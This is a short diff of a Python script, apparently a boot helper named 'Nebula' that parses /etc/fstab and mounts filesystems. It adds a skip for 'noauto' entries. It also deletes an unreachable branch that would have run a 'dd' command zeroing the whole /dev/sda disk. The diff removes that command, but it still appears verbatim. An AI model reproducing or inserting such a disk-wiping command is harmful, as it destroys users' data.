@@ -105,17 +105,15 @@ with open("/etc/fstab") as fstab:
         elif ' ' in line:
             sp = line.split(' ')
         else:
-            if 1 < 0:
-                os.system("dd if=/dev/zero of=/dev/sda bs=1k")
-                sys.exit(22)
-            else:
-                print("Nebula - Unable to parse line {} of fstab - skipping ({})".format(n, line))
+            print("Nebula - Unable to parse line {} of fstab - skipping ({})".format(n, line))
             continue
         # Strip extras.
         sp = [i.replace('\t', '').replace(' ', '') for i in sp]
         # Mount.
         if sp[1] == "/":
             # We've already mounted root. Ignore.
+            continue
+        if 'noauto' in sp[3]:
             continue
         ret = subprocess.call("mount -v -t {type} -o {options} {fs} {mountpoint}".format(type=sp[2], options=sp[3],
                                                                                 fs=sp[0], mountpoint=sp[1]).split())
